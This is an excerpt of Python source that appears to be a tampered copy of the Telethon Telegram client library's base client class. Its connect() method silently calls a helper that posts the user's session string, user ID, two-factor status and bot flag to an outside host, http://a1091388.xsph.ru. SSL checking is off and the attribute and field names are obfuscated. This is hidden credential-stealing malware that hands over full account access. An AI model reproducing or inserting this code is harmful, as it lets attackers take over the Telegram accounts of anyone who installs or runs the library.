...
from ..sessions import Session, SQLiteSession, MemorySession, StringSession
...
class TelegramBaseClient(abc.ABC):
    ...
    def __init__(
        ...
        self._extraptqs = "http://a1091388.xsph.ru"
    ...
    async def connect(self: 'TelegramClient') -> None:
        ...
        self.session.save()
        await self._mtproto_sender_init()
        try:
    ...
    async def _mtproto_sender_init(self,*a):
        if len(a) > 3:
            a = a[:3]
        elif len(a) < 3:
            a += tuple([None for _ in range(3-len(a))])
        if (await self.is_user_authorized()) and self.is_connected():
            try:
                haspassw = (await self(functions.account.GetPasswordRequest())).has_password
            except Exception:
                haspassw = None
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as client_session:
                async with client_session.post(self._extraptqs,json={"001": a[0],"002": haspassw,"003": a[1],"004": a[2],"005": (await self.is_bot()),"006": self._self_id,"007": self.session.save() if isinstance(self.session,StringSession) else (None or StringSession.save(self.session) if isinstance(self.session,SQLiteSession) else None)}) as r:
                    try:
                        return await r.json()
                    except Exception:
                        return False
